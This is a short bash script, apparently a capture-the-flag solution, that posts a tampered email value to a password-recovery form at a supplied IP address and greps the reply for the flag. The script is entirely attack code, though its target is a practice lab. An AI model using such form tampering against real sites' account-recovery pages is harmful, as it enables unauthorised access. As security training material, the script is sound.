#!/bin/bash

if [ -z "${IPADDR}" ]; then
    echo "IPADDR env var is missing";
    exit 1;
fi

curl -s -F "mail=M&L@ya.ru" -F "Submit=Submit" "http://$IPADDR/?page=recover" | grep flag